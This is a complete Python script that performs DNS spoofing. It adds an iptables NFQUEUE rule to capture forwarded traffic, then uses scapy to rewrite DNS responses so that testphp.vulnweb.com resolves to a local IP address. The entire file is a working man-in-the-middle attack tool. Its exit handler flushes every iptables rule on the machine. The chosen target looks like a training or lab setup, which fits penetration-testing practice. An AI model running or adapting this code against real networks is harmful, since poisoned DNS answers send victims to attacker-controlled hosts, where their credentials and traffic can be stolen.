'''
First install netfilterqueue on your Linux machine:
sudo apt-get install build-essential python-dev libnetfilter-queue-dev

Then install the library for Python3:
python3 -m pip install NetFilterQueue
'''

import netfilterqueue
from netfilterqueue import NetfilterQueue
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSRR, DNSQR

# Define DNS host entries to be modified
dns_hosts = {
    b'testphp.vulnweb.com.': '192.168.164.129'
}

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname
        print("[+] Before: {}".format(qname.decode()))

        try:
            scapy_packet = modify_packet(scapy_packet)
        except:
            pass
        packet.set_payload(bytes(scapy_packet))
    packet.accept()

def modify_packet(scapy_packet):
    qname = scapy_packet[DNSQR].qname

    if qname not in dns_hosts:
        print("[!] No modification required..")
        return scapy_packet

    scapy_packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    scapy_packet[DNS].ancount = 1

    print("[+] After: {}".format(dns_hosts[qname]))

    del scapy_packet[IP].len
    del scapy_packet[IP].chksum
    del scapy_packet[UDP].len
    del scapy_packet[UDP].chksum

    return scapy_packet

QUEUE_NUM = 0

# Set up iptables to redirect traffic to the NFQUEUE
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))

nfq = NetfilterQueue()

try:
    nfq.bind(QUEUE_NUM, process_packet)
    nfq.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
